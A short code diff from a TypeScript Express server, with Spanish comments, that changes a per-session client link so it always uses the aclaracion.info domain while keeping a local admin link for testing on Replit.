@@ -1023,10 +1023,10 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const baseUrl = req.headers.host || (isReplit ? `${process.env.REPL_SLUG || 'workspace'}.replit.dev` : clientDomain);
       const protocol = req.headers['x-forwarded-proto'] || 'https';
       
-      // Usamos el formato numérico directamente (sin "client/") en la URL
-      const clientLink = isReplit 
-        ? `${protocol}://${baseUrl}/${sessionId}` 
-        : `https://aclaracion.info/${sessionId}`;
+      // FORZAMOS el uso de aclaracion.info independientemente del entorno
+      const clientLink = `https://aclaracion.info/${sessionId}`;
+      
+      // Para el admin link, si estamos en Replit permitimos usar la URL local para testing
       const adminLink = isReplit 
         ? `${protocol}://${baseUrl}` 
         : `https://${adminDomain}`;
